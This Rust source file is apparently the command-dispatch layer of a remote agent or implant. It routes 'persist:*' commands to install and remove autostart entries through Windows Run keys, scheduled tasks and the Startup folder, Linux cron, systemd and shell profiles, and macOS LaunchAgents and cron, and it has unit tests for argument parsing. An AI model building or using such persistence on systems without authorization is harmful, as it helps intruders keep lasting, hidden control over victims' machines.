// src/agent/handlers/persistence.rs
//
// Dispatch shim for the persist:* command family.
// Parses arguments from the command string and delegates to
// crate::agent::persistence::*. All functions return DispatchResult
// via wrap_result so the router stays uniform.

use super::{DispatchResult, AgentAction, wrap_result};
use crate::agent::persistence as persist;

// ── Argument parsing ──────────────────────────────────────────────────

/// Split `args` on the first space into (name, rest). Returns an error
/// DispatchResult if the split fails.
fn split2<'a>(args: &'a str, usage: &'a str) -> Result<(&'a str, &'a str), DispatchResult> {
    match args.splitn(2, ' ').collect::<Vec<_>>()[..] {
        [a, b] if !a.is_empty() && !b.is_empty() => Ok((a, b)),
        _ => Err(DispatchResult::Reply(
            String::new(),
            format!("Usage: {usage}"),
            1,
            AgentAction::None,
        )),
    }
}

fn require_arg<'a>(arg: &'a str, usage: &'a str) -> Result<&'a str, DispatchResult> {
    if arg.trim().is_empty() {
        Err(DispatchResult::Reply(
            String::new(),
            format!("Usage: {usage}"),
            1,
            AgentAction::None,
        ))
    } else {
        Ok(arg.trim())
    }
}

// ── Windows — Run key ─────────────────────────────────────────────────

pub fn handle_run(args: &str) -> DispatchResult {
    match split2(args, "persist:run <value-name> <binary-path>") {
        Ok((name, path)) => wrap_result(persist::install_run(name, path)),
        Err(e) => e,
    }
}

pub fn handle_run_hklm(args: &str) -> DispatchResult {
    match split2(args, "persist:run_hklm <value-name> <binary-path>") {
        Ok((name, path)) => wrap_result(persist::install_run_hklm(name, path)),
        Err(e) => e,
    }
}

pub fn handle_run_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:run_remove <value-name>") {
        Ok(name) => wrap_result(persist::remove_run(name)),
        Err(e)   => e,
    }
}

pub fn handle_run_hklm_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:run_hklm_remove <value-name>") {
        Ok(name) => wrap_result(persist::remove_run_hklm(name)),
        Err(e)   => e,
    }
}

// ── Windows — Scheduled Task ──────────────────────────────────────────

pub fn handle_task(args: &str) -> DispatchResult {
    match split2(args, "persist:task <task-name> <binary-path>") {
        Ok((name, path)) => wrap_result(persist::install_task(name, path)),
        Err(e) => e,
    }
}

pub fn handle_task_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:task_remove <task-name>") {
        Ok(name) => wrap_result(persist::remove_task(name)),
        Err(e)   => e,
    }
}

// ── Windows — Startup Folder ──────────────────────────────────────────

pub fn handle_startup(args: &str) -> DispatchResult {
    match split2(args, "persist:startup <filename> <source-path>") {
        Ok((name, path)) => wrap_result(persist::install_startup(name, path)),
        Err(e) => e,
    }
}

pub fn handle_startup_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:startup_remove <filename>") {
        Ok(name) => wrap_result(persist::remove_startup(name)),
        Err(e)   => e,
    }
}

// ── Linux — Cron ──────────────────────────────────────────────────────

pub fn handle_cron_linux(args: &str) -> DispatchResult {
    match require_arg(args, "persist:cron <binary-path>") {
        Ok(path) => wrap_result(persist::install_cron_linux(path)),
        Err(e)   => e,
    }
}

pub fn handle_cron_linux_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:cron_remove <binary-path>") {
        Ok(path) => wrap_result(persist::remove_cron_linux(path)),
        Err(e)   => e,
    }
}

// ── Linux — Systemd ───────────────────────────────────────────────────

pub fn handle_systemd(args: &str) -> DispatchResult {
    match split2(args, "persist:systemd <unit-name> <binary-path>") {
        Ok((name, path)) => wrap_result(persist::install_systemd(name, path)),
        Err(e) => e,
    }
}

pub fn handle_systemd_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:systemd_remove <unit-name>") {
        Ok(name) => wrap_result(persist::remove_systemd(name)),
        Err(e)   => e,
    }
}

// ── Linux — Shell Profile ─────────────────────────────────────────────

pub fn handle_profile(args: &str) -> DispatchResult {
    match require_arg(args, "persist:profile <binary-path>") {
        Ok(path) => wrap_result(persist::install_profile(path)),
        Err(e)   => e,
    }
}

pub fn handle_profile_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:profile_remove <binary-path>") {
        Ok(path) => wrap_result(persist::remove_profile(path)),
        Err(e)   => e,
    }
}

// ── macOS — LaunchAgent ───────────────────────────────────────────────

pub fn handle_launchagent(args: &str) -> DispatchResult {
    match split2(args, "persist:launchagent <label> <binary-path>") {
        Ok((label, path)) => wrap_result(persist::install_launchagent(label, path)),
        Err(e) => e,
    }
}

pub fn handle_launchagent_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:launchagent_remove <label>") {
        Ok(label) => wrap_result(persist::remove_launchagent(label)),
        Err(e)    => e,
    }
}

// ── macOS — Cron ─────────────────────────────────────────────────────

pub fn handle_cron_macos(args: &str) -> DispatchResult {
    match require_arg(args, "persist:cron <binary-path>") {
        Ok(path) => wrap_result(persist::install_cron_macos(path)),
        Err(e)   => e,
    }
}

pub fn handle_cron_macos_remove(args: &str) -> DispatchResult {
    match require_arg(args, "persist:cron_remove <binary-path>") {
        Ok(path) => wrap_result(persist::remove_cron_macos(path)),
        Err(e)   => e,
    }
}

// ── Inventory ─────────────────────────────────────────────────────────

pub fn handle_list() -> DispatchResult {
    DispatchResult::Reply(persist::list(), String::new(), 0, AgentAction::None)
}

// ── Tests ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── split2 / require_arg helpers ──────────────────────────────────

    #[test]
    fn split2_separates_two_args() {
        let r = split2("MyName C:\\agent.exe", "usage");
        assert!(r.is_ok(), "split2 should succeed with two space-separated args");
        assert_eq!(r.ok().unwrap(), ("MyName", "C:\\agent.exe"));
    }

    #[test]
    fn split2_keeps_spaces_in_second_arg() {
        let r = split2("MyName C:\\Program Files\\agent.exe", "u");
        assert!(r.is_ok(), "split2 should preserve spaces in the second arg");
        let (name, path) = r.ok().unwrap();
        assert_eq!(name, "MyName");
        assert_eq!(path, "C:\\Program Files\\agent.exe");
    }

    #[test]
    fn split2_empty_input_is_error() {
        assert!(split2("", "usage").is_err());
    }

    #[test]
    fn split2_single_token_is_error() {
        assert!(split2("OnlyOne", "usage").is_err());
    }

    #[test]
    fn require_arg_trims_whitespace() {
        let r = require_arg("  /tmp/agent  ", "u");
        assert!(r.is_ok(), "require_arg should accept a non-blank arg");
        assert_eq!(r.ok().unwrap(), "/tmp/agent");
    }

    #[test]
    fn require_arg_blank_is_error() {
        assert!(require_arg("", "u").is_err());
        assert!(require_arg("   ", "u").is_err());
    }

    // ── handle_list ───────────────────────────────────────────────────

    #[test]
    fn handle_list_returns_exit_zero() {
        match handle_list() {
            DispatchResult::Reply(_, _, 0, AgentAction::None) => {}
            _ => panic!("handle_list must return Reply with exit code 0"),
        }
    }

    #[test]
    fn handle_list_output_is_non_empty() {
        match handle_list() {
            DispatchResult::Reply(out, _, 0, _) => {
                assert!(!out.is_empty(), "list output must not be empty");
            }
            _ => panic!("Expected Reply"),
        }
    }

    // ── handle_run ────────────────────────────────────────────────────

    #[test]
    fn handle_run_empty_args_returns_usage() {
        match handle_run("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_run_one_arg_returns_usage() {
        match handle_run("JustName") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn handle_run_valid_args_non_windows_platform_error() {
        match handle_run("MyKey C:\\agent.exe") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("windows"),
                    "Non-Windows platform error must mention 'windows': {err}");
            }
            _ => panic!("Expected platform error Reply"),
        }
    }

    // ── handle_run_hklm ───────────────────────────────────────────────

    #[test]
    fn handle_run_hklm_empty_args_returns_usage() {
        match handle_run_hklm("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_run_remove / handle_run_hklm_remove ───────────────────

    #[test]
    fn handle_run_remove_blank_returns_usage() {
        match handle_run_remove("   ") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_run_hklm_remove_blank_returns_usage() {
        match handle_run_hklm_remove("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_task ───────────────────────────────────────────────────

    #[test]
    fn handle_task_empty_args_returns_usage() {
        match handle_task("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_task_remove_blank_returns_usage() {
        match handle_task_remove("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_startup ────────────────────────────────────────────────

    #[test]
    fn handle_startup_empty_args_returns_usage() {
        match handle_startup("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_startup_remove_blank_returns_usage() {
        match handle_startup_remove("   ") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_systemd ────────────────────────────────────────────────

    #[test]
    fn handle_systemd_empty_args_returns_usage() {
        match handle_systemd("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_systemd_remove_blank_returns_usage() {
        match handle_systemd_remove("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_systemd_valid_args_never_panics() {
        // Parsing succeeds; actual operation may fail on wrong platform
        let r = handle_systemd("unit-name /tmp/fake_agent");
        matches!(r, DispatchResult::Reply(_, _, _, _));
    }

    // ── handle_profile ────────────────────────────────────────────────

    #[test]
    fn handle_profile_empty_arg_returns_usage() {
        match handle_profile("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_profile_remove_blank_returns_usage() {
        match handle_profile_remove("   ") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_launchagent ────────────────────────────────────────────

    #[test]
    fn handle_launchagent_empty_args_returns_usage() {
        match handle_launchagent("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn handle_launchagent_remove_blank_returns_usage() {
        match handle_launchagent_remove("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── handle_cron ───────────────────────────────────────────────────

    #[cfg(target_os = "linux")]
    #[test]
    fn handle_cron_linux_blank_returns_usage() {
        match handle_cron_linux("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn handle_cron_macos_blank_returns_usage() {
        match handle_cron_macos("") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.to_lowercase().contains("usage"), "Got: {err}");
            }
            _ => panic!("Expected usage error"),
        }
    }

    // ── Platform guards at handler level ──────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn handle_run_hklm_non_windows_error_not_panic() {
        match handle_run_hklm("Key C:\\path.exe") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(!err.is_empty(), "Platform error must not be empty");
            }
            _ => panic!("Expected error Reply"),
        }
    }

    #[cfg(not(target_os = "linux"))]
    #[test]
    fn handle_systemd_non_linux_error_not_panic() {
        match handle_systemd("svc /tmp/agent") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(!err.is_empty(), "Platform error must not be empty");
            }
            _ => panic!("Expected error Reply"),
        }
    }

    #[cfg(not(target_os = "macos"))]
    #[test]
    fn handle_launchagent_non_macos_error_not_panic() {
        match handle_launchagent("com.test /tmp/agent") {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(!err.is_empty(), "Platform error must not be empty");
            }
            _ => panic!("Expected error Reply"),
        }
    }
}
